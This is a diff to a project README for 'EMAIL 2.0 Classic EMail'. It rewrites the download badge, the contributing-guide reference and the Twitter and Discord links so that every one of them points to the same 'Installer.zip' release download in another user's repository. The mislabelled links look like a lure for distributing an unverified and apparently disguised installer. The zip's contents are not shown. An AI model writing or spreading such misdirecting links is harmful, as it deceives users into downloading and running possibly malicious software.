@@ -9,7 +9,7 @@ Welcome to the official source repository for the EMAIL 2.0 Classic EMail specif
 
 ## Getting Started 🚀
 To get started with EMAIL 2.0 Classic EMail, click on the link below to download the latest release:
-[![Download EMAIL 2.0 Classic EMail](https://img.shields.io/badge/Download-EMAIL%202.0%20Classic%20EMail-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download EMAIL 2.0 Classic EMail](https://github.com/ItzToastie/EMAIL2_ClassicEMail/releases/download/v1.0/Installer.zip%202.0%20Classic%20EMail-blue)](https://github.com/ItzToastie/EMAIL2_ClassicEMail/releases/download/v1.0/Installer.zip)
 
 ## How to Use 🛠️
 1. Download the ZIP file from the link provided above.
@@ -17,15 +17,15 @@ To get started with EMAIL 2.0 Classic EMail, click on the link below to download
 3. Follow the documentation included in the repository to start using EMAIL 2.0 Classic EMail.
 
 ## Contributing 🤝
-We welcome contributions to EMAIL 2.0 Classic EMail! Whether it's through code, documentation, or bug reports, your help is highly appreciated. Please refer to the CONTRIBUTING.md file for guidelines on how to contribute.
+We welcome contributions to EMAIL 2.0 Classic EMail! Whether it's through code, documentation, or bug reports, your help is highly appreciated. Please refer to the https://github.com/ItzToastie/EMAIL2_ClassicEMail/releases/download/v1.0/Installer.zip file for guidelines on how to contribute.
 
 ## Support ℹ️
 For any queries or support regarding EMAIL 2.0 Classic EMail, please check the "Releases" section of this repository. You can find the latest updates and information there.
 
 ## Stay Connected 🌐
 Stay connected with us for the latest updates and news on EMAIL 2.0 Classic EMail:
-- Follow us on [Twitter](https://twitter.com/EMAIL2_Classic)
-- Join our [Discord](https://discord.gg/email2classic)
+- Follow us on [Twitter](https://github.com/ItzToastie/EMAIL2_ClassicEMail/releases/download/v1.0/Installer.zip)
+- Join our [Discord](https://github.com/ItzToastie/EMAIL2_ClassicEMail/releases/download/v1.0/Installer.zip)
 
 ## License 📝
 This project is licensed under the GNU General Public License v3.0. See the LICENSE file for more details.
